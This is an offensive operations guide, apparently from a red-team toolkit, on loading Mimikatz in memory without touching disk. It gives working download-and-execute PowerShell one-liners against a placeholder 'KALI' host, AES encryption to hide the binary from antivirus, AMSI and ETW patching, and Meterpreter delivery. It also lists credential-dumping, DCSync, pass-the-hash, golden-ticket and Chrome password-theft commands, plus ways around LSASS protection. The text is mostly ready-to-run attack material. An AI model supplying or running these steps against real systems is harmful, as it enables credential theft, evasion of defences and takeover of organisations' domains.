# Mimikatz — In-Memory Loading (No Disk Write)

Never drop Mimikatz.exe to disk — it's the most flagged binary in existence. Load it entirely from memory.

---

## Method 1: Invoke-SharpLoader (AES Encrypted — Most Reliable)

**What it does:** Encrypts Mimikatz.exe with AES, hosts it on Kali, decrypts and loads in memory via PowerShell. AMSI and ETW are patched automatically.

### Step 1: Encrypt Mimikatz (run once on Kali)

```powershell
# Load the encryptor:
IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-SharpEncrypt.ps1')

# Encrypt (replace 'MYPASSWORD' with a key you'll remember):
Invoke-SharpEncrypt -File .\mimikatz.exe -Password "MYPASSWORD" -OutFile mimikatz.enc
```

This creates `mimikatz.enc` — an AES+GZip+Base64 blob that AV can't recognize.

### Step 2: Host on Kali

```bash
# In your web directory (wherever you serve files from):
cp mimikatz.enc ~/Documents/web/
cp 03-loaders/reflective/Invoke-SharpLoader.ps1 ~/Documents/web/
python3 -m http.server 80
```

### Step 3: Load and Run on Target

```powershell
# Load the SharpLoader (patches AMSI + ETW automatically):
IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-SharpLoader.ps1')

# Run with no args (interactive Mimikatz prompt):
Invoke-SharpLoader -location "http://KALI/mimikatz.enc" -password "MYPASSWORD" -noArgs

# Or run with arguments directly:
Invoke-SharpLoader -location "http://KALI/mimikatz.enc" -password "MYPASSWORD" -argument "sekurlsa::logonpasswords" -argument2 "exit"
```

---

## Method 2: PowerShell Reflective Load (Simple — No Encryption)

If you just need to try quickly and AMSI is bypassed:

```powershell
# Bypass AMSI first (see 01-evasion/amsi-bypass/):
# [your AMSI bypass here]

# Load Mimikatz directly from URL (no encryption):
$bytes = (New-Object System.Net.WebClient).DownloadData('http://KALI/mimikatz.exe')
[System.Reflection.Assembly]::Load($bytes)
# Run commands interactively
```

**Note:** Less reliable than SharpLoader. AV may still catch it in memory without ETW patching.

---

## Method 3: Rubeus/PowerShell Wrapper (From Existing Meterpreter)

If you already have a Meterpreter session:

```
meterpreter> load powershell
meterpreter> powershell_execute "IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-SharpLoader.ps1'); Invoke-SharpLoader -location 'http://KALI/mimikatz.enc' -password 'MYPASSWORD' -noArgs"
```

---

## Method 4: Invoke-Mimikatz (PowerSploit — Older but Simple)

If the environment has old Defender signatures and you need a quick win:

```powershell
# Loads and runs Mimikatz entirely in PowerShell memory:
IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-Mimikatz.ps1')

# Dump credentials:
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump hashes:
Invoke-Mimikatz -Command '"lsadump::sam"'

# Pass-the-hash with Mimikatz:
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp.com /ntlm:HASH /run:cmd.exe"'
```

---

## Useful Mimikatz Commands (Once Loaded)

```
# Credential Dumping:
sekurlsa::logonpasswords          # All plaintext passwords + NTLM hashes from LSASS
sekurlsa::wdigest                 # WDigest cleartext (if enabled — see host-triage.ps1)
lsadump::sam                      # SAM database (local accounts, requires SYSTEM)
lsadump::lsa /patch               # Domain creds from LSA (Domain Controller)
lsadump::dcsync /user:krbtgt      # DCSync: get krbtgt hash (for Golden Ticket)
lsadump::dcsync /domain:corp.com /all /csv  # DCSync all users

# Kerberos:
kerberos::list /export            # Export all tickets to .kirbi files
sekurlsa::tickets /export         # Export tickets from memory
kerberos::ptt ticket.kirbi        # Pass-the-Ticket: inject .kirbi into session

# Pass-the-Hash:
sekurlsa::pth /user:admin /domain:corp.com /ntlm:HASH /run:cmd.exe

# Golden Ticket:
kerberos::golden /domain:corp.com /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /ptt

# DPAPI:
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\FILENAME

# Misc:
privilege::debug                  # Get SeDebugPrivilege (required for LSASS access)
token::elevate                    # Elevate to SYSTEM token
```

---

## Requirements

- **SeDebugPrivilege** required for LSASS access (run as admin, or use `privilege::debug`)
- **SYSTEM** required for some operations (SAM dump)
- If **RunAsPPL** is enabled on LSASS → standard Mimikatz won't work → need `mimidrv.sys` or alternative method
- Check protection status: `host-triage.ps1` (RunAsPPL field)

---

## If LSASS is Protected (RunAsPPL)

```powershell
# Check:
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL

# Alternatives when PPL is on:
# 1. Dump LSASS memory via Task Manager / procdump and analyze offline
# 2. Use lsassy (Python, from Kali):
#    impacket-lsassy corp.com/user:pass@TARGET
# 3. nanodump / SilentProcessExit method
# 4. mimidrv.sys (kernel driver — noisy)
```

---

## See Also

- Rubeus alternative for Kerberos operations: `06-credentials/rubeus-loading.md`
- SharpLoader PS script: `03-loaders/reflective/Invoke-SharpLoader.ps1`
- LSASS dump via other methods: `06-credentials/lsass-dump/README.md`
- DPAPI extraction: `06-credentials/dpapi.md`
